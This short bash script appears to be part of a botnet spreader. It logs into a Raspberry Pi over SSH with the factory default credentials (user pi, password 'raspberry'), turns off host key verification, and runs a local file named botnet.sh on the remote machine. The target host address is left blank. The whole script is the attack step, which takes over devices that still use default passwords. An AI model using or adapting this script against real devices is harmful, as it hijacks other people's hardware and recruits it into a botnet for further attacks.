#!/bin/bash


sshpass -p "raspberry" ssh -o StrictHostKeyChecking=no pi@ 'bash -s' < botnet.sh